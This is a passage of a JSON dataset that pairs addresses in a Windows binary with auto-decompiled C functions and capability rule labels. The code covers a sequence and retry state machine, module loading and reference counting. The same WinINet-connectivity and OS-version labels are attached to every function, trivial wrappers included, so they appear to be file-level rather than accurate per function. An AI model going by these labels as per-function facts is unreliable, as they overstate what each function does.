((uStack88 == *(arg1 + 0x1c) || (uStack88 == *(arg1 + 0x1d))))) {\n                        *(arg1 + 0x18) = 0;\n                        goto code_r0x000617bf;\n                    }\n                    if ((*(arg1 + 0x18) == 3) && ((uStack87 & 8) != 0)) {\n                        if (uStack88 == *(arg1 + 0x1d)) {\n                            if (iVar5 == 2) {\n                                uStackX8 = CONCAT11(4, uStack88);\n                                uStackX10 = uVar1;\n                                iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n                                if (iVar5 == 0) {\n                                    *(arg1 + 0x1d) = *(arg1 + 0x1d) + '\\x01';\n                                    iVar9 = apuStack80[0] + 3;\n                                    apuStack80[0] = NULL;\n                                    *piStackX32 = iVar9;\n                                    *in_stack_00000028 = uStack84 - 3;\n                                    goto code_r0x000617b4;\n                                }\n                            }\n                            else {\n                                fcn.00030310(arg1 + 0x70);\n                                if (*(arg1 + 0x14) == 0) {\n                                    if (*(arg1 + 0x10) != 0) {\n                                        if ((uStack84 + *(arg1 + 0xa0) < 0x100000) &&\n                                           (puVar8 = fcn.00030c98(0x18),  puVar8 != NULL)) {\n                                            uStackX8 = CONCAT11(4, uStack88);\n                                            uStackX10 = uVar1;\n                                            iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n                                            if (iVar5 != 0) goto code_r0x000617d2;\n                                            *puVar8 = 0;\n                                            puVar8[1] = 0;\n                                            puVar8[2] = 0;\n                                            puVar8[1] = apuStack80[0];\n                                            *(puVar8 + 2) = uStack84;\n                                            apuStack80[0] = NULL;\n                                            if (*(arg1 + 0x98) == NULL) {\n                                                *(arg1 + 0x90) = puVar8;\n                                            }\n                                            else {\n                                                **(arg1 + 0x98) = puVar8;\n                                            }\n                                            *(arg1 + 0x98) = puVar8;\n                                            *(arg1 + 0xa0) = *(arg1 + 0xa0) + uStack84;\n                                            fcn.0002fcb8(arg1 + 0x80);\n                                            *(arg1 + 0x1d) = *(arg1 + 0x1d) + '\\x01';\n                                        }\n                                        fcn.00030378(arg1 + 0x70);\n                                        goto code_r0x000616eb;\n                                    }\n                                    iVar5 = 0x21590003;\n                                }\n                                else {\n                                    iVar5 = 0x21590006;\n                                }\ncode_r0x000617d2:\n                                fcn.00030378(arg1 + 0x70);\n                            }\n                            goto code_r0x0006177f;\n                        }\n                        uStackX8 = CONCAT11(4, uStack88);\n                        if (0x7e < *(arg1 + 0x1d) - uStack88) {\n                            uStackX8 = CONCAT11(0x20, uStack88);\n                        }\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n                        if (iVar5 != 0) goto code_r0x0006177f;\n                    }\ncode_r0x000616eb:\n                    if (((uStack87 & 2) != 0) && (uStack88 == *(arg1 + 0x1d))) {\n                        uStackX8 = CONCAT11(4, uStack88);\n                        uStackX10 = uVar1;\n                        iVar5 = fcn.00060cd8(arg1, 0, 0, &uStackX8);\n                        if (iVar5 == 0) {\n                            *(arg1 + 0x18) = 0;\n                            *(arg1 + 0x10) = 0;\n                            fcn.0002fcb8(arg1 + 0x80);\n                            goto code_r0x0006174a;\n                        }\n                        goto code_r0x0006177f;\n                    }\n                    goto code_r0x0006174a;\n                }\n                uStackX8 = CONCAT11(2, uStack88);\n            }\n            uStackX10 = uVar1;\n            fcn.00060cd8(arg1, 0, 0, &uStackX8);\n        }\n        else if ((*(arg1 + 0x18) == 2) || (*(arg1 + 0x18) == 1)) goto code_r0x00061388;\ncode_r0x0006174a:\n        fcn.00063bf8(*(arg1 + 8), apuStack80[0]);\n    }\n    apuStack80[0] = NULL;\ncode_r0x00061770:\n    iVar5 = *(arg1 + 0x14);\n    iVar2 = *0xfffff78000000320;\n    goto joined_r0x000610e5;\n}\n",
        "token_count": 3357
    },
    "00061998": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00061998(int64_t arg1, ulong arg2, uchar *arg3, int64_t *arg4)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int64_t iVar5;\n    bool bVar6;\n    int32_t *in_stack_00000028;\n    uint32_t in_stack_00000030;\n    \n    iVar5 = 0;\n    fcn.00030310(arg1 + 0x70);\n    iVar3 = *(arg1 + 0x14);\n    do {\n        if (iVar3 != 0) {\n            uVar4 = 0x21590006;\ncode_r0x00061aec:\n            fcn.00030378(arg1 + 0x70);\n            return uVar4;\n        }\n        if (*(arg1 + 0x10) == 0) {\n            uVar4 = 0x21590003;\n            goto code_r0x00061aec;\n        }\n        if ((arg2 == 1) && (*(arg1 + 0x8c) != 0)) {\n            uVar4 = 0;\n            *arg3 = *(arg1 + 0x88);\n            *(arg1 + 0x8c) = 0;\n            goto code_r0x00061aec;\n        }\n        if ((arg2 == 2) && (*(arg1 + 0x90) != 0)) {\n            *arg4 = *(*(arg1 + 0x90) + 8) + 3;\n            *in_stack_00000028 = *(*(arg1 + 0x90) + 0x10) + -3;\n            arg1_00 = *(arg1 + 0x90);\n            *(arg1 + 0xa0) = *(arg1 + 0xa0) - *(arg1_00 + 2);\n            iVar5 = *arg1_00;\n            fcn.00030d24(arg1_00);\n            uVar4 = 0;\n            *(arg1 + 0x90) = iVar5;\n            if (iVar5 == 0) {\n                *(arg1 + 0x98) = 0;\n            }\n            if (*in_stack_00000028 == 0) {\n                fcn.00063bf8(*(arg1 + 8), *arg4 + -3);\n                *arg4 = 0;\n            }\n            goto code_r0x00061aec;\n        }\n        bVar6 = *(arg1 + 0x78) != 0;\n        if (bVar6) {\n            *(arg1 + 0x7c) = *(arg1 + 0x7c) + 1;\n        }\n        else {\n            *(arg1 + 0x78) = 1;\n        }\n        fcn.00030378(arg1 + 0x70);\n        iVar1 = *0xfffff78000000320;\n        if (!bVar6) {\n            uVar4 = fcn.000610b4(arg1, arg2, arg3, arg4);\n            fcn.00030310(arg1 + 0x70);\n            *(arg1 + 0x78) = 0;\n            fcn.0002fcb8(arg1 + 0x80);\n            goto code_r0x00061aec;\n        }\n        if (in_stack_00000030 == 0) {\n            uVar4 = 0x21590002;\n            goto code_r0x00061aec;\n        }\n        if (in_stack_00000030 != 0xffffffff) {\n            uVar2 = (**0x11308)();\n            iVar5 = (uVar2 * iVar1) / 10000;\n        }\n        iVar3 = fcn.0002fce4(arg1 + 0x80, in_stack_00000030);\n        iVar1 = *0xfffff78000000320;\n        if (iVar3 == 0) {\n            uVar4 = 0x21590002;\n            fcn.00030310(arg1 + 0x70);\n            *(arg1 + 0x7c) = *(arg1 + 0x7c) + -1;\n            goto code_r0x00061aec;\n        }\n        if (in_stack_00000030 != 0xffffffff) {\n            uVar2 = (**0x11308)();\n            uVar2 = (uVar2 * iVar1) / 10000 - iVar5;\n            if (in_stack_00000030 < uVar2) {\n                in_stack_00000030 = 0;\n            }\n            else {\n                in_stack_00000030 = in_stack_00000030 - uVar2;\n            }\n        }\n        fcn.00030310(arg1 + 0x70);\n        *(arg1 + 0x7c) = *(arg1 + 0x7c) + -1;\n        iVar3 = *(arg1 + 0x14);\n    } while( true );\n}\n",
        "token_count": 1111
    },
    "00061c0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00061c0c(int64_t arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    \n    if (*(arg1 + 0x14) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            uVar1 = 0x21590003;\n        }\n        else {\n            uVar1 = fcn.00061998(arg1, 2, 0, arg2);\n        }\n    }\n    else {\n        uVar1 = 0x21590006;\n    }\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "00061c48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00061c48(int64_t arg1, ulong arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    char cVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    char acStackX8 [32];\n    uchar uStack88;\n    uchar uStack87;\n    char cStack86;\n    \n    iVar7 = 0x21590002;\n    fcn.00030310(arg1 + 0x20);\n    if (*(arg1 + 0x14) == 0) {\n        if (*(arg1 + 0x10) == 0) {\n            iVar7 = 0x21590003;\n        }\n        else {\n            uStack88 = *(arg1 + 0x1c);\n            uStack87 = arg4;\n            uVar5 = fcn.000667b8();\n            iVar9 = 0;\n            uVar1 = uVar5 >> 0x1f & 0x7f;\n            cVar4 = (uVar5 + uVar1 & 0x7f) - uVar1;\n            cStack86 = cVar4;\n            if (0 < *(arg1 + 0x58)) {\n                do {\n                    iVar2 = *0xfffff78000000320;\n                    uVar6 = (**0x11308)();\n                    iVar7 = fcn.00060cd8(arg1, arg2, arg3 & 0xffffffff, &uStack88);\n                    if (iVar7 != 0) break;\n                    iVar7 = fcn.00061998(arg1, 1, acStackX8, 0);\n                    iVar3 = *0xfffff78000000320;\n                    if (iVar7 == 0) {\n                        if (acStackX8[0] == cVar4) {\n                            uVar8 = (**0x11308)();\n                            uVar6 = (uVar8 * iVar3) / 10000 - (uVar6 * iVar2) / 10000;\n                            if (uVar6 < 100) {\n                                uVar6 = 100;\n                            }\n                            uVar6 = *(arg1 + 0x30) + uVar6 >> 1;\n                            *(arg1 + 0x30) = uVar6;\n                            if (60000 < uVar6) {\n                                *(arg1 + 0x30) = 60000;\n                            }\n                            *(arg1 + 0x1c) = *(arg1 + 0x1c) + '\\x01';\n                            iVar7 = 0;\n                            break;\n                        }\n                        iVar9 = iVar9 + -1;\n                    }\n                    else {\n                        if (iVar7 != 0x21590002) goto code_r0x00061e18;\n                        if (iVar9 < *(arg1 + 0x58) + -1) {\n                            uVar6 = *(arg1 + 0x60);\n                            if (uVar6 <= *(arg1 + 0x30)) {\n                                uVar6 = uVar6 + *(arg1 + 0x30);\n                            }\n                            *(arg1 + 0x30) = uVar6;\n                        }\n                        else {\n                            iVar7 = 0x21590002;\n                        }\n                    }\n                    iVar9 = iVar9 + 1;\n                } while (iVar9 < *(arg1 + 0x58));\n                if (iVar7 != 0x21590002) goto code_r0x00061e18;\n            }\n            *(arg1 + 0x18) = 0;\n            *(arg1 + 0x10) = 0;\n            uStack87 = 0x20;\n            fcn.00060cd8(arg1, 0, 0, &uStack88);\n        }\n    }\n    else {\n        iVar7 = 0x21590006;\n    }\ncode_r0x00061e18:\n    fcn.00030378(arg1 + 0x20);\n    return iVar7;\n}\n",
        "token_count": 913
    },
    "000621f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.000621f4(int64_t arg1, int64_t arg2, int64_t *arg3, ulong *arg4)\n\n{\n    ulong uVar1;\n    uchar uVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    \n    if (((arg1 == 0) || (arg3 == NULL)) || (arg4 == NULL)) {\n        uVar4 = 0x21590064;\n    }\n    else {\n        puVar3 = fcn.00030cc4(0x28);\n        if (puVar3 == NULL) {\n            uVar4 = 0x21590004;\n        }\n        else {\n            puVar3[1] = arg1;\n            puVar3[2] = arg2;\n            *puVar3 = 0;\n            uVar4 = *arg4;\n            uVar1 = arg4[1];\n            puVar3[3] = uVar4;\n            puVar3[4] = uVar1;\n            uVar2 = (**0x113f0)(uVar4, arg3 + 4);\n            if (*arg3 == 0) {\n                *arg3 = puVar3;\n            }\n            else {\n                *arg3[1] = puVar3;\n            }\n            arg3[2] = arg3[2] + arg2;\n            arg3[1] = puVar3;\n            (**0x113e8)(arg3 + 4, uVar2);\n            fcn.0002fcb8(arg3 + 3);\n            uVar4 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 358
    },
    "00062368": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00062368(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg1_00;\n    uchar *puVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    int64_t *piVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int32_t iVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    uint32_t in_stack_00000038;\n    \n    iVar11 = 0;\n    *arg1 = NULL;\n    iVar4 = *arg2;\n    piVar6 = arg2;\n    do {\n        if (iVar4 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.00030d48(*piVar6);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar3 = fcn.0006682a(arg1_00, 0x2e);\n        if (puVar3 != NULL) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        iVar4 = fcn.00063870(arg1_00);\n        if (iVar4 == 0) {\n            fcn.00030d24(arg1_00);\n            if (*0x8e2b8 != 0) {\n                uVar5 = (**(*0x8e2b8 + 0x14))(arg1, *piVar6, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                uVar8 = uVar5 & 0xffffffff;\n                if ((uVar5 == 0) && (iVar4 = *0x8e2b8,  *0x8e2b8 != 0)) goto code_r0x000624eb;\n                if (uVar5 != 0x21590005) {\n                    return uVar5;\n                }\n                goto code_r0x000624b4;\n            }\n        }\n        else {\n            if (puVar3 == NULL) {\n                iVar7 = -1;\n                pcVar10 = arg1_00;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar1 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar1 != '\\0');\n                iVar9 = ~iVar7 - 1;\n            }\n            else {\n                iVar9 = puVar3 - arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            uVar2 = (**(iVar4 + 0x14))(arg1, iVar9 + *piVar6, arg3, arg4, in_stack_00000028, in_stack_00000030, \n                                       in_stack_00000038 & 0xfffeffff);\n            uVar8 = uVar2;\ncode_r0x000624b4:\n            if (iVar4 != 0) {\n                if (uVar8 != 0) {\n                    return uVar8;\n                }\ncode_r0x000624eb:\n                if (*arg1 == NULL) {\n                    (**(iVar4 + 0x1c))(0, 0);\n                    (**(iVar4 + 0x24))(*arg1, 0);\n                    return 0xffffffff;\n                }\n                piVar6 = fcn.00030c98(0x18);\n                if (piVar6 != NULL) {\n                    *piVar6 = iVar4;\n                    *(piVar6 + 1) = 0;\n                    *(piVar6 + 0xc) = 0;\n                    piVar6[2] = 1;\n                    **arg1 = piVar6;\n                    iVar9 = fcn.0005ce3c(*arg1, 1);\n                    if (iVar9 != 0) {\n                        LOCK();\n                        *0x8e298 = *0x8e298 + 1;\n                        return uVar8;\n                    }\n                    fcn.00030d24(piVar6);\n                }\n                (**(iVar4 + 0x1c))(*arg1, 0);\n                (**(iVar4 + 0x24))(*arg1, 0);\n                *arg1 = NULL;\n                return 0x21590004;\n            }\n        }\n        iVar11 = iVar11 + 1;\n        piVar6 = arg2 + iVar11;\n        iVar4 = *piVar6;\n    } while( true );\n}\n",
        "token_count": 1048
    },
    "0006257c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0006257c(int64_t **arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *arg1_00;\n    \n    arg1_00 = *arg1;\n    if (0 < arg1_00[2]) {\n        LOCK();\n        piVar1 = arg1_00 + 2;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.0005ceb0(arg1, 1);\n            (**(**arg1 + 0x24))(arg1, *(arg1_00 + 0xc));\n            fcn.00030d24(arg1_00);\n            LOCK();\n            *0x8e298 = *0x8e298 + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "000625cc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000625cc(int64_t **arg1, ulong arg2)\n\n{\n    int64_t **arg1_00;\n    int64_t *piVar1;\n    int32_t iVar2;\n    \n    arg1_00 = *arg1;\n    fcn.00030310(0x8e2a0);\n    iVar2 = fcn.0005cf30(arg1_00, 1);\n    if ((iVar2 == 0) || (piVar1 = *arg1_00,  *(piVar1 + 1) != 0)) {\n        fcn.00030378(0x8e2a0);\n    }\n    else {\n        *(piVar1 + 0xc) = arg2;\n        *(piVar1 + 1) = 1;\n        fcn.00030378(0x8e2a0);\n        (**(**arg1_00 + 0x1c))(arg1_00, arg2);\n        fcn.0006257c(arg1_00);\n    }\n    *arg1 = NULL;\n    return;\n}\n",
        "token_count": 239
    },
    "000626a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000626a0(int64_t **arg1, ulong *arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t *arg1_00;\n    \n    uVar5 = fcn.00062644(arg1);\n    if (uVar5 == 0) {\n        if ((***arg1 < 0x35) || (pcVar1 = *(**arg1 + 0xd),  pcVar1 == NULL)) {\n            fcn.0006257c(arg1);\n            uVar5 = 0x21590001;\n        }\n        else {\n            uVar3 = (*pcVar1)(arg1, arg2, arg3);\n            uVar5 = uVar3;\n            if (uVar3 == 0) {\n                arg1_00 = fcn.00030c98(0x18);\n                if (arg1_00 == NULL) {\n                    fcn.0006257c(arg1);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    return 0x21590004;\n                }\n                iVar2 = **arg1;\n                *(arg1_00 + 1) = 0;\n                *(arg1_00 + 0xc) = 0;\n                *arg1_00 = iVar2;\n                arg1_00[2] = 1;\n                **arg2 = arg1_00;\n                iVar4 = fcn.0005ce3c(*arg2, 1);\n                if (iVar4 == 0) {\n                    fcn.00030d24(arg1_00);\n                    (**(**arg1 + 0x24))(*arg2, 0);\n                    *arg2 = 0;\n                    uVar5 = 0x21590004;\n                }\n                else {\n                    LOCK();\n                    *0x8e298 = *0x8e298 + 1;\n                }\n            }\n            else if (*(*arg1 + 1) != 0) {\n                uVar5 = 0x21590006;\n            }\n            fcn.0006257c(arg1);\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 511
    },
    "00062934": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00062934(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00062644(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x45) || (pcVar1 = *(**arg1 + 0x11),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.0006257c(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 216
    },
    "0006299c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0006299c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = fcn.00062644(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x4d) || (pcVar1 = *(**arg1 + 0x13),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.0006257c(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 225
    },
    "00062a0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00062a0c(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062644(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x55) || (pcVar1 = *(**arg1 + 0x15),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.0006257c(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 241
    },
    "00062a88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00062a88(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062644(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x65) || (pcVar1 = *(**arg1 + 0x19),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.0006257c(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 240
    },
    "00062b04": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00062b04(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint in_stack_00000028;\n    \n    uVar3 = fcn.00062644(arg1);\n    if (uVar3 == 0) {\n        if ((***arg1 < 0x6d) || (pcVar1 = *(**arg1 + 0x1b),  pcVar1 == NULL)) {\n            uVar3 = 0x21590001;\n        }\n        else {\n            uVar2 = (*pcVar1)(arg1, arg2, arg3, arg4, in_stack_00000028);\n            uVar3 = uVar2;\n            if ((uVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                uVar3 = 0x21590006;\n            }\n        }\n        fcn.0006257c(arg1);\n    }\n    return uVar3;\n}\n",
        "token_count": 242
    },
    "00062b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00062b80(int64_t *arg1, ulong arg2, ulong arg3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t arg2_00;\n    uint32_t auStackX32 [2];\n    \n    iVar2 = fcn.00062644(arg1);\n    if (iVar2 == 0) {\n        if ((***arg1 < 0x75) || (pcVar1 = *(**arg1 + 0x1d),  pcVar1 == NULL)) {\n            fcn.0006257c(arg1);\n            iVar2 = 0x21590001;\n        }\n        else {\n            iVar2 = (*pcVar1)(arg1, arg2);\n            if ((iVar2 != 0) && (*(*arg1 + 8) != 0)) {\n                iVar2 = 0x21590006;\n            }\n            fcn.0006257c(arg1);\n        }\n    }\n    if (iVar2 == 0x21590001) {\n        arg2_00 = fcn.0006380c(arg2, auStackX32);\n        if (arg2_00 == 0) {\n            iVar2 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.0006299c(arg1, arg2_00, auStackX32[0], arg3);\n            fcn.00030d24(arg2_00);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 330
    },
    "00062c64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00062c64(int64_t **arg1, int64_t *arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    char *arg1_00;\n    uchar *puVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int64_t iVar8;\n    ulong in_stack_00000028;\n    uint in_stack_00000030;\n    int32_t in_stack_00000040;\n    \n    iVar8 = 0;\n    *arg1 = NULL;\n    iVar3 = *arg2;\n    piVar4 = arg2;\n    do {\n        if (iVar3 == 0) {\n            return 0x21590005;\n        }\n        arg1_00 = fcn.00030d48(*piVar4);\n        if (arg1_00 == NULL) {\n            return 0x21590004;\n        }\n        puVar2 = fcn.0006682a(arg1_00, 0x2e);\n        if (puVar2 != NULL) {\n            *puVar2 = 0;\n            puVar2 = puVar2 + 1;\n        }\n        iVar3 = fcn.00063894(arg1_00);\n        if (iVar3 == 0) {\n            fcn.00030d24(arg1_00);\n            if (*0x8e2c0 != 0) {\n                if (in_stack_00000040 == 0) {\n                    iVar6 = (**(*0x8e2c0 + 0x14))(arg1);\n                }\n                else {\n                    iVar6 = (**(*0x8e2c0 + 0x1c))(arg1, *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n                }\n                iVar3 = *0x8e2c0;\n                if (iVar6 == 0) goto code_r0x00062dc9;\n            }\n        }\n        else {\n            if (puVar2 == NULL) {\n                iVar5 = -1;\n                pcVar7 = arg1_00;\n                do {\n                    if (iVar5 == 0) break;\n                    iVar5 = iVar5 + -1;\n                    cVar1 = *pcVar7;\n                    pcVar7 = pcVar7 + 1;\n                } while (cVar1 != '\\0');\n                iVar6 = ~iVar5 - 1;\n            }\n            else {\n                iVar6 = puVar2 - arg1_00;\n            }\n            fcn.00030d24(arg1_00);\n            if (in_stack_00000040 == 0) {\n                iVar6 = (**(iVar3 + 0x14))();\n            }\n            else {\n                iVar6 = (**(iVar3 + 0x1c))(arg1, iVar6 + *piVar4, arg3, arg4, in_stack_00000028, in_stack_00000030);\n            }\ncode_r0x00062dc9:\n            if (iVar3 != 0) {\n                if (iVar6 != 0) {\n                    return iVar6;\n                }\n                if (*arg1 != NULL) {\n                    piVar4 = fcn.00030c98(0x18);\n                    if (piVar4 != NULL) {\n                        *piVar4 = iVar3;\n                        *(piVar4 + 1) = 0;\n                        *(piVar4 + 0xc) = 0;\n                        piVar4[2] = 1;\n                        **arg1 = piVar4;\n                        iVar6 = fcn.0005ce3c(*arg1, 4);\n                        if (iVar6 != 0) {\n                            LOCK();\n                            *0x8e2a8 = *0x8e2a8 + 1;\n                            return 0;\n                        }\n                        fcn.00030d24(piVar4);\n                    }\n                    (**(iVar3 + 0x24))(*arg1, 0);\n                    (**(iVar3 + 0x2c))(*arg1, 0);\n                    *arg1 = NULL;\n                    return 0x21590004;\n                }\n                (**(iVar3 + 0x24))(0, 0);\n                (**(iVar3 + 0x2c))(*arg1, 0);\n                return -1;\n            }\n        }\n        iVar8 = 